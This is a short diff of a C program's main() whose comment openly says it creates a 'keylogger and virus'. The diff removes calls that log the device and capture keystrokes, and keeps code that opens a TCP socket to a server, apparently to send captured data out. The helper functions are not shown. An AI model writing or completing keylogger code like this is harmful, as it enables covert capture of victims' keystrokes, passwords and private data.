@@ -14,11 +14,6 @@ Main function to run to create keylogger and virus
 const socklen_t MAX_IP_ADDR_LEN = 16;
 
 int main(void) {
-  key_package key_package;
-  key_package.keys_arr_size = 0;
-  log_device(&key_package);
-  log_keys(&key_package);
-  print_logged_keys(key_package);
   // Open a TCP socket to connect to the server.
   int socket_descriptor = open_tcp_socket();
   (void)fprintf(stderr, "Client socket descriptor: %d\n", socket_descriptor);
